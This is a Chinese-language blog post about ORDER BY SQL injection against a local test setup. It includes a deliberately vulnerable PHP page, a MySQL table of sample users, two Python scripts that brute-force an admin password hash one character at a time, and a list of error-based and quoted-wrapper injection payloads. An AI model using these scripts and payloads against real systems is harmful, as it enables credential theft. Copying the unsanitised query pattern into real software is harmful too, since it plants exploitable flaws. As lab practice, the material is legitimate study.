---
title: order by injection
author: tank96a
layout: post
categories:
  - article
tags:
  - sqli
  - python
---

 本地搭建测试系统进行注入实践，包含php网页脚本、mysql数据库脚本、python爆破脚本。
 
{% raw %}
<pre>
order by 字段1,字段2 DESC  字段1是排序第一关键字，默认为升序;字段2是排序第二关键字,这里指定为降序
order by apples,IF(1,bananas,cherries) desc
order by apples,(case when 1 then bananas else cherries end) desc

ASCII(SUBSTRING((SELECT password FROM fruits WHERE username = 0x41646d696e),1,1))=0x30
</pre>
{% endraw %}

python爆破脚本，用到了requests模块，必须在linux下运行。
{% highlight python %}
#版本1
import requests,string
charset = 'abcdef'+string.digits 
AdminHash=''
url = 'http://192.168.1.101/DebugPHP/3.php'  
for i in range(1,33):
    for c in  charset:  
        payload="?by=3,(CASE WHEN (SELECT SUBSTRING(password,%d,1) FROM fruits where username=0x41646d696e)='%c' +\
                 THEN username ELSE password END) --" %(i, c)
        res = requests.get(url+payload)
        if "21</td><td>System" in res.text:
            AdminHash+=c
            break
print AdminHash  #e10adc3949ba59abbe56e057f20f894e

#版本2
import requests,string
charset = 'abcdef'+string.digits 
AdminHash=''
url = 'http://192.168.1.101/DebugPHP/3.php'  
for i in range(1,33):
    for c in  charset:                 
        payload="?by=IF(SUBSTR((SELECT password from fruits WHERE username  +\
                =CHAR(65,100,109,105,110)),%d,1)=char(%d),username,password) LIMIT 2--" %(i,ord(c))             
        res = requests.get(url+payload)
        if "2</td><td>Admin" in res.text:
            AdminHash+=c
            break
print AdminHash
{% endhighlight %}

php本地注入测试脚本
{% highlight php %}
<?php
function mysql_fetch_all($result)
{
	$rows=array();
	while($row=mysql_fetch_array($result)){
		array_push($rows,$row);
	}
	return $rows;
}
$host = '192.168.1.103';
$dbuser ='root';
$dbpass ='';
$dbname ="security";
$tbname = "fruits";

$con = mysql_connect($host,$dbuser,$dbpass);
if (!$con) echo "Failed to connect to MySQL: " . mysql_error();
mysql_select_db($dbname,$con) or die ( "Unable to connect to the table: $dbname".mysql_error());

$orderby=$_GET['by'];
$sql="SELECT * FROM fruits ORDER BY $orderby LIMIT 10";
$result = mysql_query($sql);
$rows=mysql_fetch_all($result);
 
echo '<table>'.PHP_EOL;
$i = 1;
foreach ($rows as $row)     
{
	//print_r($row);
	echo sprintf('<tr>');
	echo sprintf('<td align="left">%d</td>', $i++);
	echo sprintf('<td>%s</td>', $row['username']);
	echo sprintf('<td>%s</td>', $row['apples']);
	echo sprintf('<td>%s</td>', $row['bananas']);
	echo sprintf('<td>%s</td></tr>', $row['cherries']);
}
echo '</table>'.PHP_EOL;
mysql_close($con);
?>
{% endhighlight %}

mysql数据库脚本
{% raw %}
<pre>
mysql> show databases;
mysql> source /root/Desktop/junk2/test.sql 导入数据
mysql> show tables;
mysql> desc fruits;
+----------+------------------+------+-----+---------+-------+
| Field    | Type             | Null | Key | Default | Extra |
+----------+------------------+------+-----+---------+-------+
| username | varchar(32)      | NO   | PRI |         |       |
| password | char(32)         | YES  |     | NULL    |       |
| apples   | int(10) unsigned | YES  |     | 0       |       |
| bananas  | int(10) unsigned | YES  |     | 0       |       |
| cherries | int(10) unsigned | YES  |     | 0       |       |
+----------+------------------+------+-----+---------+-------+

/*test.sql script*/
use security;
CREATE TABLE IF NOT EXISTS fruits(
username VARCHAR(32) CHARACTER SET ascii COLLATE ascii_general_ci,
password CHAR(32) CHARACTER SET ascii COLLATE ascii_bin,
apples   INT(10) UNSIGNED DEFAULT 0,
bananas  INT(10) UNSIGNED DEFAULT 0,
cherries INT(10) UNSIGNED DEFAULT 0,PRIMARY KEY(username)
);
insert into fruits values ('Horst1','e10adc3949ba59abbe56e057f20f883e',1,1,1);
insert into fruits values ('Harald1','e10adc3949ba59abbe56e057f20f884e',1,1,1);
insert into fruits values ('Horst','e10adc3949ba59abbe56e057f20f885e',1,5,3);
insert into fruits values ('Peter1','e10adc3949ba59abbe56e057f20f886e',1,1,1);
insert into fruits values ('Harald2','e10adc3949ba59abbe56e057f20f887e',2,2,2);
insert into fruits values ('Horst2','e10adc3949ba59abbe56e057f20f888e',2,2,2);
insert into fruits values ('Peter2','e10adc3949ba59abbe56e057f20f889e',2,2,2);
insert into fruits values ('Peter','e10adc3949ba59abbe56e057f20f890e',2,3,5);
insert into fruits values ('Aaron','e10adc3949ba59abbe56e057f20f891e',2,3,4);
insert into fruits values ('Peter3','e10adc3949ba59abbe56e057f20f892e',3,3,3);
insert into fruits values ('Harald3','e10adc3949ba59abbe56e057f20f893e',3,3,3);
insert into fruits values ('Admin','e10adc3949ba59abbe56e057f20f894e',3,2,4);
insert into fruits values ('Horst3','e10adc3949ba59abbe56e057f20f895e',3,3,3);
insert into fruits values ('Horst4','e10adc3949ba59abbe56e057f20f896e',4,4,4);
insert into fruits values ('Harald4','e10adc3949ba59abbe56e057f20f897e',4,4,4);
insert into fruits values ('Peter4','e10adc3949ba59abbe56e057f20f898e',4,4,4);
insert into fruits values ('Harald','e10adc3949ba59abbe56e057f20f899e',4,4,1);
insert into fruits values ('System','e10adc3949ba59abbe56e057f20f900e',5,1,2);
insert into fruits values ('Horst5','e10adc3949ba59abbe56e057f20f901e',5,5,5);
insert into fruits values ('Peter5','e10adc3949ba59abbe56e057f20f902e',5,5,5);
insert into fruits values ('Harald5','e10adc3949ba59abbe56e057f20f903e',5,5,5);
</pre>
{% endraw %}


其他注入知识点：
{% raw %}
<pre>
mysql> select flag from flag where flag='' and (select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) and '';
ERROR 1062 (23000): Duplicate entry 'security1' for key 'group_key'

update users set password='',password=(select email_id from emails limit 0,1) where username='admin4';

''=(payload)=''
' or (payload) or '
' and (payload) and '
' or (payload) and '
' or (payload) and '='
'*  (payload)  *'
' or (payload) and '
" – (payload) – "

mysql常用命令：
select hex('Admin');  /*41646D696E*/
select concat(0x41646d696e);  /*Admin*/

Create database newdb;
use newdb;
CREATE TABLE users(id int(3) NOT NULL AUTO_INCREMENT,username varchar(20) NOT NULL,password varchar(20) NOT NULL,PRIMARY KEY (id));
desc users;  查看表的结构
insert into users (id, username, password) values (1, 'Jane', 'Eyre'); 插入数据
</pre>
{% endraw %}

经典文章：

[Injection in Insert, Update and Delete Statements](https://osandamalith.wordpress.com/2014/04/26/injection-in-insert-update-and-delete-statements)

[kali下注入学习网站](http://localhost/sqli-labs/Less-1/?id=1)
